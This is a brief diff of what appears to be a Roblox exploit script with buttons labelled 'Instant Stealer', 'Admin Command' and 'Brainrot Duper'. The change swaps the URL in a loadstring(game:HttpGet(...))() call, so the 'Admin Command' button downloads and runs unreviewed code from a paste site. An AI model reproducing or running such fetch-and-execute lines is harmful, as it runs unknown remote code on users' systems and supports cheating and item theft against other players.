@@ -122,7 +122,7 @@ createButton("Button1", "Instant Stealer", function()
 end)
 
 createButton("Button2", "Admin Command", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Ok"))()
+    loadstring(game:HttpGet("https://pastefy.app/OqMCs93p/raw"))()
 end)
 
 createButton("Button3", "Brainrot Duper", function()
